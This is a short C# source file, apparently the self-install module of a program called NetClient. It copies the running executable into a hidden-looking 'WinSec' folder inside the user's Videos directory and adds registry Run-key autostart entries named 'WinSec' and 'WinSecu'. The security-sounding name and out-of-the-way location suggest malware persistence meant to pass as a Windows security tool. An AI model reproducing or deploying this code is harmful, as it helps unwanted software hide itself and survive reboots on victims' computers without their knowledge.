using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NetClient {
	class InstallSelf {

		public static string INSTALL_DIRECTORY_PATH = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\WinSec\";
		public static string INSTALL_FILE_PATH = INSTALL_DIRECTORY_PATH + "winsec.exe";
		public static string CURRENT_FILE_PATH = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

		public static void InstallApp() {
			//Copy File
			if (!Directory.Exists(INSTALL_DIRECTORY_PATH))
				Directory.CreateDirectory(INSTALL_DIRECTORY_PATH);
			File.Copy(CURRENT_FILE_PATH, INSTALL_FILE_PATH);

			//Reg AutoStart
			RunWhenStart(true, "WinSec", INSTALL_FILE_PATH);

			//Start installed App
			Process.Start(INSTALL_FILE_PATH);

			//Exit
			Application.Exit();
		}
		public static void Install() {
			//string path = Environment.CurrentDirectory.EndsWith("\\") ? Environment.CurrentDirectory : Environment.CurrentDirectory + "\\";
			if (!File.Exists(@"./1.d")) {
				RunWhenStart(true, "WinSecu", System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
				File.Create(@"./1.d");
			}
		}
		private static void RunWhenStart(bool Started, string name, string path) {
			RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
			try {
				if (Started == true) {
					rk.SetValue(name, "\"" + path + "\"");
				}
				else {
					rk.DeleteValue(name);
				}
			}
			catch (Exception ex) {
				ex.GetHashCode();
				return;
			}
			finally {
				rk.Close();
			}
		}
	}
}
